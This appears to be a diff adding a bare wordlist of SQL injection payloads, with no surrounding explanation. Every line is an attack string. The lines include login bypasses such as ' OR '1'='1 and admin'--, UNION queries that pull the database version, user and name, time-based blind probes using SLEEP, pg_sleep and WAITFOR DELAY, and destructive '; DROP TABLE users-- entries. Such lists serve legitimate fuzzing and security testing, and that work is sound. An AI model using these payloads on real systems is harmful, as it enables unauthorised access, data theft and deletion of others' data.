@@ -1,0 +1,52 @@
+'
+"
+' OR '1'='1
+" OR "1"="1
+' OR 1=1--
+" OR 1=1--
+' OR 1=1#
+" OR 1=1#
+' OR 1=1/*
+admin'--
+admin"--
+admin' #
+admin"#
+admin'/*
+' OR 'x'='x
+" OR "x"="x
+') OR ('x')=('x
+") OR ("x")=("x
+' OR 1=1 LIMIT 1--
+" OR 1=1 LIMIT 1--
+' AND (SELECT COUNT(*) FROM tabname)>=1--
+" AND (SELECT COUNT(*) FROM tabname)>=1--
+' UNION SELECT @@version--
+" UNION SELECT @@version--
+' UNION SELECT NULL,NULL,NULL--
+" UNION SELECT NULL,NULL,NULL--
+' AND 1=1--
+" AND 1=1--
+' AND 1=2--
+" AND 1=2--
+'; DROP TABLE users--
+"; DROP TABLE users--
+' OR SLEEP(5)--
+" OR SLEEP(5)--
+' OR pg_sleep(5)--
+" OR pg_sleep(5)--
+'; WAITFOR DELAY '00:00:05'--
+"; WAITFOR DELAY '00:00:05'--
+' OR BENCHMARK(1000000,MD5(1))--
+" OR BENCHMARK(1000000,MD5(1))--
+' UNION SELECT user()--
+" UNION SELECT user()--
+' UNION SELECT database()--
+" UNION SELECT database()--
+' UNION SELECT version()--
+" UNION SELECT version()--
+1'
+1"
+1' AND '1'='1
+1" AND "1"="1
+1' AND '1'='2
+1" AND "1"="2
